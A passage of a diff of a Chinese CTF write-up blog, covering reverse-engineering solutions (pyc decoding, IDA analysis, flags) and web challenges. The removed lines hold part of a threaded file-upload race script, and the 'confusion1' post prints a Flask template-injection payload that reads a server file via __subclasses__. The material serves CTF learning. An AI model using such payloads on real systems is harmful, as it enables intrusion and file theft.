P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x85\xc3\x81\x1e\x00\x00\x00\xff\xff\xed\xd31\r\x000\x0c\xc0\xb0R\xf9\xd3\x1d\x84\\xedeC\x88\x94\x1b\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xac\xb1W\x98\xf7\x01PK\x01\x02\x14\x00\x14\x00\x00\x00\x08\x00\xd4]mS\xedA\x00\xbb\xad\x06\x00\x00t\x12\x04\x00\x05\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00A.txt\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xd8M\x03\x10A\xd8\xd7\x01O\xe5\xec\x13A\xd8\xd7\x01\x1b\x05?\xf2@\xd8\xd7\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00W\x00\x00\x00\xd0\x06\x00\x00\x00\x00\r\n——WebKitFormBoundaryWoFwKBXGzbWzFApV–\r\n”</p>
-<pre><code>requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
-b1 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.zip&quot;, headers=burp0_headers, cookies=burp0_cookies).text
-b2 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.txt&quot;, headers=burp0_headers, cookies=burp0_cookies).text
-b3 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.txt&quot;, headers=burp0_headers, cookies=burp0_cookies).text
-print(b1)
+  <h1 id="3-python-trade"><a href="#3-python-trade" class="headerlink" title="3_python-trade"></a>3_python-trade</h1><p>pyc 逆向 </p>
+<p>使用pyc反编译 </p>
+<p>网站</p>
+<p><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.gjw123.com/tools-pyc">http://www.gjw123.com/tools-pyc</a></p>
+<p>反编译结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">visit https://tool.lu/pyc/ for more information</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encode(message):</span><br><span class="line">    s = &#x27;&#x27;</span><br><span class="line">    for i in message:</span><br><span class="line">        x = ord(i) ^ 32</span><br><span class="line">        x = x + 16</span><br><span class="line">        s += chr(x)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    return base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">print &#x27;Input flag:&#x27;</span><br><span class="line">flag = raw_input()</span><br><span class="line">if encode(flag) == correct:</span><br><span class="line">    print &#x27;correct&#x27;</span><br><span class="line">else:</span><br><span class="line">    print &#x27;wrong&#x27;</span><br></pre></td></tr></table></figure>
 
-if not b1.match(&#39;.*404 Not Found&#39;, b1.text):
-    print(b1.text)
-if not b2.match(&#39;.*404 Not Found&#39;, b2.text):
-    print(b2.text)
-if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
-    print(b3.text)
-</code></pre>
-<p>def upload():<br>    try:<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)</p>
-<pre><code>except:
-    # print(&quot;0&quot;)
-    pass
-</code></pre>
-<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    while(True):<br>        upload()</p>
+
+
+<p>写脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span><br><span class="line">a = base64.b64decode(correct)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">s = &#x27;&#x27;</span><br><span class="line">for i in a:</span><br><span class="line">    s += chr((ord(chr(i)) - 16) ^ 32)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+
+<p>nctf{d3c0mpil1n9_PyC}</p>
+<p>其中s += chr((ord(chr(i)) - 16) ^ 32) 如果没有chr强转会报ord 的错</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-4_re1"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/4_re1/"
+    >4_re1</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/4_re1/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="4-re1"><a href="#4-re1" class="headerlink" title="4_re1"></a>4_re1</h1><p>丢 ida  F5</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa6znito3j30km0bcgpq.jpg" alt="image.png"></p>
+<p>根据逻辑分析</p>
+<p>​    比较v5 v7</p>
+<p>如果 v5 大于v7 输出 正数</p>
+<p>如果 v5 小于 v7 输出 负数</p>
+<p>v5 v7 相等 输出 0</p>
+<p>所以判断flag是在aFlagGet</p>
+<p>进入后</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9q4iaoyj30z30lak6i.jpg" alt="image.png"></p>
+<p>然后在  </p>
+<p>aFlagGet 上 jump hex window</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9r6fwe5j30ja08on64.jpg" alt="image.png"></p>
+<p>DUTCTF{We1c0met0DUTCTF}</p>
  
       <!-- reward -->
       
@@ -437,11 +435,26 @@ if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/8_logmein/"
+    >logmein</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/8_logmein/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.387Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/8_logmein/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
@@ -483,6 +496,61 @@ if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
 
     
     <article
+  id="post-6_open-source"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/6_open-source/"
+    >6_open-source</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/6_open-source/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="6-open-source"><a href="#6-open-source" class="headerlink" title="6_open-source"></a>6_open-source</h1><p>修改后的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">//    if (argc != 4) &#123;</span><br><span class="line">//        printf(&quot;what?\n&quot;);</span><br><span class="line">//        exit(1);</span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">//    unsigned int first = atoi(argv[1]);</span><br><span class="line">//    if (first != 0xcafe) &#123;</span><br><span class="line">//        printf(&quot;you are wrong, sorry.\n&quot;);</span><br><span class="line">//        exit(2);</span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">    unsigned int second = atoi(argv[2]);</span><br><span class="line">    if (second % 5 == 3 || second % 17 != 8) &#123;</span><br><span class="line">        printf(&quot;ha, you won&#x27;t get it!\n&quot;);</span><br><span class="line">        exit(3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123;</span><br><span class="line">        printf(&quot;so close, dude!\n&quot;);</span><br><span class="line">        exit(4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Brr wrrr grr\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned int hash = 0xcafe * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Get your key: &quot;);</span><br><span class="line">    printf(&quot;%x\n&quot;, hash);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwabdas904j30j105at9k.jpg" alt="image.png"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-7_simple-unpack"
   class="article article-type-post"
   itemscope
@@ -490,11 +558,26 @@ if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/7_simple-unpack/"
+    >simple-unpack</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/7_simple-unpack/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.385Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/7_simple-unpack/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
@@ -529,27 +612,51 @@ if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
 
     
     <article
-  id="post-6_open-source"
+  id="post-Confusion1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/Confusion1/"
+    >confusion1</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/6_open-source/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.383Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/Confusion1/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="6-open-source"><a href="#6-open-source" class="headerlink" title="6_open-source"></a>6_open-source</h1><p>修改后的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">//    if (argc != 4) &#123;</span><br><span class="line">//        printf(&quot;what?\n&quot;);</span><br><span class="line">//        exit(1);</span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">//    unsigned int first = atoi(argv[1]);</span><br><span class="line">//    if (first != 0xcafe) &#123;</span><br><span class="line">//        printf(&quot;you are wrong, sorry.\n&quot;);</span><br><span class="line">//        exit(2);</span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">    unsigned int second = atoi(argv[2]);</span><br><span class="line">    if (second % 5 == 3 || second % 17 != 8) &#123;</span><br><span class="line">        printf(&quot;ha, you won&#x27;t get it!\n&quot;);</span><br><span class="line">        exit(3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123;</span><br><span class="line">        printf(&quot;so close, dude!\n&quot;);</span><br><span class="line">        exit(4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Brr wrrr grr\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned int hash = 0xcafe * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Get your key: &quot;);</span><br><span class="line">    printf(&quot;%x\n&quot;, hash);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  <p>访问 <a target="_blank" rel="noopener" href="http://111.200.241.244:62141/login.php">http://111.200.241.244:62141/login.php</a></p>
+<p>以及 <a target="_blank" rel="noopener" href="http://111.200.241.244:62141/register.php">http://111.200.241.244:62141/register.php</a></p>
+<p>发现源代码上有hint</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwabdas904j30j105at9k.jpg" alt="image.png"></p>
- 
+<p>访问其他页面 没有什么明显的漏洞 </p>
+<p>看图片 是蛇缠绕了大象 想到python和php</p>
+<p>目前python想到就是flask模板注入</p>
+<p>试试看</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwfxjhrqjhj318r09njvi.jpg" alt="image.png"></p>
+<p>存在模板注入</p>
+<p>有waf</p>
+<p>payload </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure> 
       <!-- reward -->
       
     </div>
@@ -569,87 +676,42 @@ if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
 
     
     <article
-  id="post-5_game"
+  id="post-get_shell"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/get_shell/"
+    >pwn</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/5_game/" class="article-date">
-  <time datetime="2021-11-15T09:38:44.381Z" itemprop="datePublished">2021-11-15</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="5-game"><a href="#5-game" class="headerlink" title="5_game"></a>5_game</h1><p>丢ida 找main f5</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9u3wrzcj31ld0x41kx.jpg" alt="image.png"></p>
-<p>很容易发现 </p>
-<p>sub_457AB4(); 就是flag</p>
-<p>进入<img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9vdyxu3j307o0390t5.jpg" alt="image.png"></p>
-<p>在进入</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9vxqnzpj30gd0lu79k.jpg" alt="image.png"></p>
-<h2 id="qmemcpy"><a href="#qmemcpy" class="headerlink" title="qmemcpy"></a>qmemcpy</h2><p>  void * memcpy ( void * dest, const void * src, size_t num );</p>
-<p>并不关心被复制的数据类型，只是逐字节地进行复制，这给函数的使用带来了很大的灵活性，可以面向任何数据类型进行复制。</p>
-<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>拷贝一个字符串到另一个字符串数组中</p>
-<p>根据题目构建python脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">v6 = []</span><br><span class="line">v3 = []</span><br><span class="line">v4 = []</span><br><span class="line">for i in range(22):</span><br><span class="line">  v3.append(1)</span><br><span class="line">for i in range(57):</span><br><span class="line">  v6.append(1)</span><br><span class="line"></span><br><span class="line">v6[0] = 18</span><br><span class="line">v6[1] = 64</span><br><span class="line">v6[2] = 98</span><br><span class="line">v6[3] = 5</span><br><span class="line">v6[4] = 2</span><br><span class="line">v6[5] = 4</span><br><span class="line">v6[6] = 6</span><br><span class="line">v6[7] = 3</span><br><span class="line">v6[8] = 6</span><br><span class="line">v6[9] = 48</span><br><span class="line">v6[10] = 49</span><br><span class="line">v6[11] = 65</span><br><span class="line">v6[12] = 32</span><br><span class="line">v6[13] = 12</span><br><span class="line">v6[14] = 48</span><br><span class="line">v6[15] = 65</span><br><span class="line">v6[16] = 31</span><br><span class="line">v6[17] = 78</span><br><span class="line">v6[18] = 62</span><br><span class="line">v6[19] = 32</span><br><span class="line">v6[20] = 49</span><br><span class="line">v6[21] = 32</span><br><span class="line">v6[22] = 1</span><br><span class="line">v6[23] = 57</span><br><span class="line">v6[24] = 96</span><br><span class="line">v6[25] = 3</span><br><span class="line">v6[26] = 21</span><br><span class="line">v6[27] = 9</span><br><span class="line">v6[28] = 4</span><br><span class="line">v6[29] = 62</span><br><span class="line">v6[30] = 3</span><br><span class="line">v6[31] = 5</span><br><span class="line">v6[32] = 4</span><br><span class="line">v6[33] = 1</span><br><span class="line">v6[34] = 2</span><br><span class="line">v6[35] = 3</span><br><span class="line">v6[36] = 44</span><br><span class="line">v6[37] = 65</span><br><span class="line">v6[38] = 78</span><br><span class="line">v6[39] = 32</span><br><span class="line">v6[40] = 16</span><br><span class="line">v6[41] = 97</span><br><span class="line">v6[42] = 54</span><br><span class="line">v6[43] = 16</span><br><span class="line">v6[44] = 44</span><br><span class="line">v6[45] = 52</span><br><span class="line">v6[46] = 32</span><br><span class="line">v6[47] = 64</span><br><span class="line">v6[48] = 89</span><br><span class="line">v6[49] = 45</span><br><span class="line">v6[50] = 32</span><br><span class="line">v6[51] = 65</span><br><span class="line">v6[52] = 15</span><br><span class="line">v6[53] = 34</span><br><span class="line">v6[54] = 18</span><br><span class="line">v6[55] = 16</span><br><span class="line">v6[56] = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v3[0] = 123</span><br><span class="line">v3[1] = 32</span><br><span class="line">v3[2] = 18</span><br><span class="line">v3[3] = 98</span><br><span class="line">v3[4] = 119</span><br><span class="line">v3[5] = 108</span><br><span class="line">v3[6] = 65</span><br><span class="line">v3[7] = 41</span><br><span class="line">v3[8] = 124</span><br><span class="line">v3[9] = 80</span><br><span class="line">v3[10] = 125</span><br><span class="line">v3[11] = 38</span><br><span class="line">v3[12] = 124</span><br><span class="line">v3[13] = 111</span><br><span class="line">v3[14] = 74</span><br><span class="line">v3[15] = 49</span><br><span class="line">v3[16] = 83</span><br><span class="line">v3[17] = 108</span><br><span class="line">v3[18] = 94</span><br><span class="line">v3[19] = 108</span><br><span class="line">v3[20] = 84</span><br><span class="line">v3[21] = 6</span><br><span class="line"></span><br><span class="line">temp = &quot;`S,yhn _uec&#123;&quot;</span><br><span class="line">for i in temp:</span><br><span class="line">  # print(ord(i))</span><br><span class="line">  